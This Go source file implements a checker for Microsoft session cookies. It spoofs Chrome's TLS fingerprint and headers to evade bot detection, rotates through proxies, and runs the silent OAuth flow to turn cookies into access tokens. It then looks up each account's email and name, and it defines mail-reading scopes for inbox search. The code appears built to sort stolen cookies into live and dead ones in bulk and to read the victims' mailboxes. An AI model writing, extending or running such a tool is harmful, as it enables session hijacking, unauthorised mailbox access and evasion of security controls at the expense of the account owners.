// Package checker validates Microsoft session cookies.
//
// Two things decide whether a checker works or lies:
//
//  1. TLS impersonation. Microsoft's edge fingerprints the ClientHello and
//     returns 403 to anything that does not look like a browser, so the stack
//     uses tls-client (uTLS) rather than net/http.
//
//  2. The probe endpoint. outlook.live.com/mail/0/inbox returns HTTP 200 with a
//     login shell for every request, authenticated or not — a status-code
//     checker reports every cookie as live. This package instead uses the
//     silent OAuth (prompt=none) flow, which answers with an access token when
//     the session is valid and with error=login_required when it is not.
package checker

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/url"
	"strings"
	"sync"
	"time"

	fhttp "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
)

const (
	// oauthEndpoint is the silent (prompt=none) implicit-grant flow. A valid
	// session yields access_token in the redirect fragment; an invalid one
	// yields error=login_required.
	oauthEndpoint = "https://login.live.com/oauth20_authorize.srf" +
		"?client_id=000000004C12AE6F" +
		"&response_type=token" +
		"&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
		"&display=touch&locale=en&prompt=none&scope="

	// ScopeMail authenticates the mailbox service. Used for the check probe.
	ScopeMail = "service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
	// ScopeGraph requests Graph Mail.Read, used for inbox search.
	ScopeGraph = "https%3A%2F%2Fgraph.microsoft.com%2FMail.Read"
	// ScopeREST requests the legacy Outlook REST mail scope.
	ScopeREST = "https%3A%2F%2Foutlook.office.com%2Fmail.read"

	// owaConfig is a cookie-only endpoint that answers 401 without a session.
	// Used as a fallback when the OAuth client is unavailable.
	owaConfig = "https://outlook.live.com/owa/service.svc?action=GetOwaUserConfiguration"

	// profileAPI resolves identity once a token is in hand.
	profileAPI = "https://substrate.office.com/profileb2/v2/me/V2?$select=displayName,mail"

	bodyLimit = 4 << 20
)

var (
	errLoginRequired = errors.New("login_required")
	errInteraction   = errors.New("interaction_required")
	errRateLimited   = errors.New("rate limited")
)

// Verdict is the outcome of a single check.
type Verdict int

const (
	Live Verdict = iota
	Dead
	Challenged // session valid but requires consent or re-authentication
	RateLimited
	Failed
)

func (v Verdict) String() string {
	switch v {
	case Live:
		return "live"
	case Dead:
		return "dead"
	case Challenged:
		return "challenged"
	case RateLimited:
		return "rate-limited"
	default:
		return "error"
	}
}

// Result carries everything the bot needs to report one cookie.
type Result struct {
	Verdict Verdict
	Email   string
	Name    string
	Reason  string
	Proxy   string
	Elapsed time.Duration
}

// Checker runs checks against a shared, proxy-keyed client pool.
type Checker struct {
	pool *clientPool
}

// New builds a Checker.
func New(timeout time.Duration, concurrency int) *Checker {
	return &Checker{pool: newClientPool(timeout)}
}

// Check validates one cookie set through the given proxy ("" for direct).
func (c *Checker) Check(ctx context.Context, ck *Cookie, proxyURL string) (res Result) {
	start := time.Now()
	res.Proxy = proxyLabel(proxyURL)
	defer func() { res.Elapsed = time.Since(start) }()

	client, err := c.pool.get(proxyURL)
	if err != nil {
		res.Verdict = Failed
		res.Reason = "client: " + err.Error()
		return res
	}

	tok, err := c.token(ctx, client, ck.Header(), ScopeMail)
	switch {
	case err == nil:
		email, name := c.profile(ctx, client, tok)
		res.Verdict = Live
		res.Email = email
		res.Name = name
		if email == "" {
			res.Reason = "authenticated, identity unresolved"
		}
		return res

	case errors.Is(err, errLoginRequired):
		res.Verdict = Dead
		res.Reason = "session expired"
		return res

	case errors.Is(err, errInteraction):
		res.Verdict = Challenged
		res.Reason = "challenge: " + err.Error()
		return res

	case errors.Is(err, errRateLimited):
		res.Verdict = RateLimited
		res.Reason = "rate limited"
		return res
	}

	// Ambiguous or the OAuth client is unusable: fall back to the cookie-only
	// endpoint so a retired client_id cannot produce false dead results.
	return c.cookieProbe(ctx, client, ck.Header(), res)
}

// token runs the silent OAuth flow for a scope and returns the access token.
func (c *Checker) token(ctx context.Context, client tls_client.HttpClient, cookieHeader, scope string) (string, error) {
	req, err := fhttp.NewRequestWithContext(ctx, fhttp.MethodGet, oauthEndpoint+scope, nil)
	if err != nil {
		return "", err
	}
	req.Header = browserHeaders(cookieHeader)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20))

	if resp.StatusCode == fhttp.StatusTooManyRequests {
		return "", errRateLimited
	}
	if resp.StatusCode != fhttp.StatusFound &&
		resp.StatusCode != fhttp.StatusSeeOther &&
		resp.StatusCode != fhttp.StatusTemporaryRedirect {
		return "", fmt.Errorf("oauth http %d", resp.StatusCode)
	}

	loc, err := url.Parse(resp.Header.Get("Location"))
	if err != nil {
		return "", fmt.Errorf("oauth location unparseable")
	}
	params, err := url.ParseQuery(loc.Fragment)
	if err != nil {
		return "", fmt.Errorf("oauth fragment unparseable")
	}

	if tok := params.Get("access_token"); tok != "" {
		return tok, nil
	}

	switch params.Get("error") {
	case "login_required":
		return "", errLoginRequired
	case "interaction_required", "consent_required", "access_denied":
		return "", fmt.Errorf("%w: %s", errInteraction, params.Get("error"))
	case "":
		return "", fmt.Errorf("oauth: no token and no error")
	default:
		return "", fmt.Errorf("oauth: %s", params.Get("error"))
	}
}

// cookieProbe asks an endpoint that genuinely requires a session.
func (c *Checker) cookieProbe(ctx context.Context, client tls_client.HttpClient, cookieHeader string, res Result) Result {
	req, err := fhttp.NewRequestWithContext(ctx, fhttp.MethodGet, owaConfig, nil)
	if err != nil {
		res.Verdict = Failed
		res.Reason = "request: " + err.Error()
		return res
	}
	req.Header = browserHeaders(cookieHeader)

	resp, err := client.Do(req)
	if err != nil {
		res.Verdict = Failed
		res.Reason = classifyNetErr(err)
		return res
	}
	defer resp.Body.Close()

	switch {
	case resp.StatusCode == fhttp.StatusOK:
		body, _ := io.ReadAll(io.LimitReader(resp.Body, bodyLimit))
		email, name := ExtractIdentity(string(body))
		res.Verdict = Live
		res.Email = email
		res.Name = name
		if email == "" {
			res.Reason = "authenticated, identity unresolved"
		}

	case resp.StatusCode == fhttp.StatusUnauthorized || resp.StatusCode == fhttp.StatusForbidden:
		res.Verdict = Dead
		res.Reason = "session expired"

	case resp.StatusCode == fhttp.StatusTooManyRequests:
		res.Verdict = RateLimited
		res.Reason = "rate limited"

	case resp.StatusCode >= 300 && resp.StatusCode < 400:
		if isLoginLocation(resp.Header.Get("Location")) {
			res.Verdict = Dead
			res.Reason = "session expired"
		} else {
			res.Verdict = Failed
			res.Reason = "redirect " + shorten(resp.Header.Get("Location"), 60)
		}

	default:
		res.Verdict = Failed
		res.Reason = fmt.Sprintf("http %d", resp.StatusCode)
	}
	return res
}

func (c *Checker) profile(ctx context.Context, client tls_client.HttpClient, token string) (string, string) {
	ctx, cancel := context.WithTimeout(ctx, 20*time.Second)
	defer cancel()

	req, err := fhttp.NewRequestWithContext(ctx, fhttp.MethodGet, profileAPI, nil)
	if err != nil {
		return "", ""
	}
	req.Header = browserHeaders("")
	req.Header.Set("authorization", "Bearer "+token)
	req.Header.Set("accept", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != fhttp.StatusOK {
		return "", ""
	}

	var p struct {
		Mail        string `json:"mail"`
		DisplayName string `json:"displayName"`
	}
	if err := json.NewDecoder(io.LimitReader(resp.Body, 1<<20)).Decode(&p); err != nil {
		return "", ""
	}
	return sanitise(p.Mail), sanitiseSpace(p.DisplayName)
}

// browserHeaders mirrors a Chrome navigation request. Keys are lowercase
// because fhttp writes them verbatim, matching the impersonated profile.
func browserHeaders(cookieHeader string) fhttp.Header {
	h := fhttp.Header{
		"accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
		"accept-language":           {"en-US,en;q=0.9"},
		"cache-control":             {"no-cache"},
		"pragma":                    {"no-cache"},
		"sec-ch-ua":                 {`"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`},
		"sec-ch-ua-mobile":          {"?0"},
		"sec-ch-ua-platform":        {`"Windows"`},
		"sec-fetch-dest":            {"document"},
		"sec-fetch-mode":            {"navigate"},
		"sec-fetch-site":            {"none"},
		"sec-fetch-user":            {"?1"},
		"upgrade-insecure-requests": {"1"},
	}
	if cookieHeader != "" {
		h["cookie"] = []string{cookieHeader}
	}
	h[fhttp.HeaderOrderKey] = []string{
		"accept", "accept-language", "cache-control", "pragma",
		"sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
		"sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
		"upgrade-insecure-requests", "cookie",
	}
	return h
}

func isLoginLocation(loc string) bool {
	l := strings.ToLower(loc)
	for _, marker := range []string{"login.live.com", "signin", "/login", "oauth20_authorize"} {
		if strings.Contains(l, marker) {
			return true
		}
	}
	return false
}

func classifyNetErr(err error) string {
	s := strings.ToLower(err.Error())
	switch {
	case strings.Contains(s, "timeout") || strings.Contains(s, "deadline exceeded"):
		return "timeout"
	case strings.Contains(s, "proxy"):
		return "proxy failure"
	case strings.Contains(s, "tls") || strings.Contains(s, "handshake"):
		return "tls failure"
	case strings.Contains(s, "no such host") || strings.Contains(s, "dns"):
		return "dns failure"
	case strings.Contains(s, "connection reset") || strings.Contains(s, "unexpected eof"):
		return "connection reset"
	}
	return "network: " + shorten(err.Error(), 80)
}

func proxyLabel(proxyURL string) string {
	if proxyURL == "" {
		return "direct"
	}
	u, err := url.Parse(proxyURL)
	if err != nil || u.Host == "" {
		return "proxy"
	}
	return u.Host
}

func shorten(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// clientPool keeps one tls-client per proxy so connection pools are reused.
type clientPool struct {
	mu      sync.Mutex
	timeout time.Duration
	clients map[string]tls_client.HttpClient
}

func newClientPool(timeout time.Duration) *clientPool {
	return &clientPool{
		timeout: timeout,
		clients: make(map[string]tls_client.HttpClient),
	}
}

func (p *clientPool) get(proxyURL string) (tls_client.HttpClient, error) {
	p.mu.Lock()
	defer p.mu.Unlock()

	if c, ok := p.clients[proxyURL]; ok {
		return c, nil
	}

	opts := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(int(p.timeout.Seconds())),
		tls_client.WithClientProfile(profiles.Chrome_124),
		tls_client.WithNotFollowRedirects(),
		tls_client.WithRandomTLSExtensionOrder(),
	}
	if proxyURL != "" {
		opts = append(opts, tls_client.WithProxyUrl(proxyURL))
	}

	c, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), opts...)
	if err != nil {
		return nil, err
	}
	p.clients[proxyURL] = c
	return c, nil
}
